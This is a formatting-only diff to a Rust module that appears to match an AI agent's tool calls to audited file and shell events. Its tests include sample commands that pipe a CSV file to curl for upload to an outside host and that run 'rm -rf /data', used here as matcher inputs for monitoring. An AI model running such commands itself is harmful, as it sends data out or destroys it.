@@ -26,7 +26,8 @@ pub const JOIN_AFTER_SECS: i64 = 30;
 
 /// Is `at` inside the window of a call recorded at `call_at`?
 pub fn in_window(call_at: DateTime<Utc>, at: DateTime<Utc>) -> bool {
-    at >= call_at - Duration::seconds(JOIN_BEFORE_SECS) && at <= call_at + Duration::seconds(JOIN_AFTER_SECS)
+    at >= call_at - Duration::seconds(JOIN_BEFORE_SECS)
+        && at <= call_at + Duration::seconds(JOIN_AFTER_SECS)
 }
 
 /// Whitespace runs to one space, ends trimmed.
@@ -90,8 +91,15 @@ pub fn note(a: &AgentEvent) -> String {
             format!(" `{short}{}`", if short.len() < s.len() { "…" } else { "" })
         })
         .unwrap_or_default();
-    let who = if who.is_empty() { String::new() } else { format!(" ({})", who.join(", ")) };
-    format!("agent session {}{who}, tool {}{what}, call {}", a.session_id, a.tool, a.call_id)
+    let who = if who.is_empty() {
+        String::new()
+    } else {
+        format!(" ({})", who.join(", "))
+    };
+    format!(
+        "agent session {}{who}, tool {}{what}, call {}",
+        a.session_id, a.tool, a.call_id
+    )
 }
 
 #[cfg(test)]
@@ -100,14 +108,26 @@ mod tests {
 
     #[test]
     fn a_shell_carries_the_whole_command() {
-        assert!(command_matches("cat /srv/GL/a.csv | curl -T - https://x", "/bin/bash -c cat /srv/GL/a.csv  | curl -T - https://x"));
-        assert!(command_matches("cat  /srv/GL/a.csv", "cat /srv/GL/a.csv"), "whitespace does not count");
+        assert!(command_matches(
+            "cat /srv/GL/a.csv | curl -T - https://x",
+            "/bin/bash -c cat /srv/GL/a.csv  | curl -T - https://x"
+        ));
+        assert!(
+            command_matches("cat  /srv/GL/a.csv", "cat /srv/GL/a.csv"),
+            "whitespace does not count"
+        );
     }
 
     #[test]
     fn a_program_of_the_command_matches_only_with_an_argument() {
-        assert!(command_matches("cat /srv/GL/a.csv | curl -T - https://x", "curl -T - https://x"));
-        assert!(!command_matches("ls -la; cat x", "ls"), "a bare program name is on every command line");
+        assert!(command_matches(
+            "cat /srv/GL/a.csv | curl -T - https://x",
+            "curl -T - https://x"
+        ));
+        assert!(
+            !command_matches("ls -la; cat x", "ls"),
+            "a bare program name is on every command line"
+        );
         assert!(!command_matches("rm /tmp/x", "rm -rf /data"));
         assert!(!command_matches("", "bash"));
     }
@@ -115,12 +135,43 @@ mod tests {
     #[test]
     fn paths_match_absolute_relative_and_below_a_folder() {
         let f = Path::new("/srv/GL/a.csv");
-        assert!(path_matches("read_file", Path::new("/srv/GL/a.csv"), FileAction::Open, f));
-        assert!(path_matches("search_files", Path::new("/srv/GL"), FileAction::Open, f));
-        assert!(path_matches("read_file", Path::new("GL/a.csv"), FileAction::Open, f));
-        assert!(!path_matches("read_file", Path::new("/srv/GL2"), FileAction::Open, f), "components, not characters");
-        assert!(!path_matches("write_file", Path::new("/srv/GL/a.csv"), FileAction::Open, f), "a write tool does not read");
-        assert!(path_matches("patch", Path::new("/srv/GL/a.csv"), FileAction::Write, f));
+        assert!(path_matches(
+            "read_file",
+            Path::new("/srv/GL/a.csv"),
+            FileAction::Open,
+            f
+        ));
+        assert!(path_matches(
+            "search_files",
+            Path::new("/srv/GL"),
+            FileAction::Open,
+            f
+        ));
+        assert!(path_matches(
+            "read_file",
+            Path::new("GL/a.csv"),
+            FileAction::Open,
+            f
+        ));
+        assert!(
+            !path_matches("read_file", Path::new("/srv/GL2"), FileAction::Open, f),
+            "components, not characters"
+        );
+        assert!(
+            !path_matches(
+                "write_file",
+                Path::new("/srv/GL/a.csv"),
+                FileAction::Open,
+                f
+            ),
+            "a write tool does not read"
+        );
+        assert!(path_matches(
+            "patch",
+            Path::new("/srv/GL/a.csv"),
+            FileAction::Write,
+            f
+        ));
     }
 
     #[test]
